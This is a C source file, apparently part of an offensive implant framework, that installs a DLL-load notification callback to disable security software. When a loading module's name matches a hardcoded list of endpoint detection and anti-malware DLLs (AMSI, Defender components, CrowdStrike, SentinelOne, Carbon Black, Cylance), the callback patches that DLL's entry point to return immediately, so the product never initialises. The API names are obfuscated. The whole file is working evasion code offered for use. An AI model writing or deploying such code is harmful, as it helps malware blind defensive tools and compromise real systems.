/**
 * dll_unhook.c - LdrRegisterDllNotification monitor to neuter EDR DLL init
 */
#include <windows.h>
#include "../../include/evasion.h"
#include "../../include/obfuscate.h"
#include "../../include/syscalls.h"

typedef struct _JAGER_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} JAGER_UNICODE_STRING;

typedef struct _LDR_DLL_NOTIFICATION_DATA {
    ULONG Flags;
    const JAGER_UNICODE_STRING *FullDllName;
    const JAGER_UNICODE_STRING *BaseDllName;
    PVOID DllBase;
    ULONG SizeOfImage;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

typedef VOID (CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG NotificationReason,
    PLDR_DLL_NOTIFICATION_DATA NotificationData,
    PVOID Context);

typedef NTSTATUS (NTAPI *pLdrRegisterDllNotification)(
    ULONG Flags,
    PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    PVOID Context,
    PVOID *Cookie);

#define LDR_DLL_NOTIFICATION_REASON_LOADED 1

static const wchar_t *g_edr_dlls[] = {
    L"amsi.dll", L"mrt.dll", L"sensesp.dll",
    L"cyinjct", L"crlook", L"crguard",
    L"sentinel", L"crowdstrike", L"carbon",
    NULL
};

static PVOID g_notify_cookie = NULL;
static BOOL g_dll_monitor_installed = FALSE;

static VOID CALLBACK dll_load_callback(
    ULONG reason,
    PLDR_DLL_NOTIFICATION_DATA data,
    PVOID context)
{
    int i;

    (void)context;
    if (reason != LDR_DLL_NOTIFICATION_REASON_LOADED)
        return;
    if (!data || !data->BaseDllName || !data->BaseDllName->Buffer)
        return;

    for (i = 0; g_edr_dlls[i]; i++) {
        if (wcsstr(data->BaseDllName->Buffer, g_edr_dlls[i])) {
            if (data->DllBase) {
                PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)data->DllBase;
                if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                    PIMAGE_NT_HEADERS nt =
                        (PIMAGE_NT_HEADERS)((BYTE *)data->DllBase + dos->e_lfanew);
                    BYTE *entry =
                        (BYTE *)data->DllBase + nt->OptionalHeader.AddressOfEntryPoint;
                    ULONG old;

                    if (jager_protect_memory(GetCurrentProcess(), entry, 16,
                                            PAGE_READWRITE, &old)) {
                        /* mov eax, 1 ; ret — DllMain returns TRUE without running */
                        entry[0] = 0xB8;
                        entry[1] = 0x01;
                        entry[2] = 0x00;
                        entry[3] = 0x00;
                        entry[4] = 0x00;
                        entry[5] = 0xC3;
                        jager_protect_memory(GetCurrentProcess(), entry, 16, old, &old);
                        FlushInstructionCache(GetCurrentProcess(), entry, 16);
                    }
                }
            }
            break;
        }
    }
}

BOOL install_dll_load_monitor(void) {
    pLdrRegisterDllNotification fnReg;

    if (g_dll_monitor_installed)
        return TRUE;

    fnReg = (pLdrRegisterDllNotification)GetProcAddress(
        GetModuleHandleA(OBF("ntdll.dll")), OBF("LdrRegisterDllNotification"));
    if (!fnReg)
        return FALSE;

    if (fnReg(0, dll_load_callback, NULL, &g_notify_cookie) != 0)
        return FALSE;

    g_dll_monitor_installed = TRUE;
    return TRUE;
}
